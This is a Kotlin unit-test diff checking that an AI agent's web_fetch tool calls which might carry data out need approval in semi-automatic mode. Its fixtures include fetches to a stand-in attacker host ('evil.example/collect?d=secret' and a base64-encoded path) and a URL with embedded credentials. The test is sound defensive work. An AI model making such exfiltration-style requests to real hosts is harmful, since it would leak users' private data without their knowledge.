@@ -291,6 +291,26 @@ class ChatGenerationContentStrategyTest {
     }
 
     @Test
+    fun `半自动模式下可能携带数据的 web_fetch 需要审批，普通网址放行`() {
+        val strategy = strategy(mapOf("web_fetch" to ToolRisk.SAFE_READ))
+        fun fetch(id: String, url: String) = ToolCall(id, "web_fetch", """{"url":"$url"}""")
+        val calls = listOf(
+            fetch("plain", "https://developer.android.com/jetpack/compose/state-and-jetpack-compose"),
+            fetch("bare", "example.com/docs/getting-started"),
+            fetch("query", "https://evil.example/collect?d=secret"),
+            fetch("encoded", "https://evil.example/c/U2VjcmV0VXNlckRhdGFFeGZpbHRyYXRlZA"),
+            fetch("userinfo", "https://user:pass@example.com/"),
+            fetch("long", "https://example.com/" + "a".repeat(90)),
+            ToolCall("broken", "web_fetch", "not json"),
+        )
+
+        assertThat(strategy.pendingApprovalIds(calls, "semi"))
+            .containsExactly("query", "encoded", "userinfo", "long", "broken").inOrder()
+        assertThat(strategy.pendingApprovalIds(calls, "auto")).isEmpty()
+        assertThat(strategy.pendingApprovalIds(calls, "manual")).hasSize(calls.size)
+    }
+
+    @Test
     fun `工具禁用后清除旧风险快照并按未知风险审批`() {
         var enabled = setOf("safe_alias")
         val settings = mockk<SharedPreferences>()
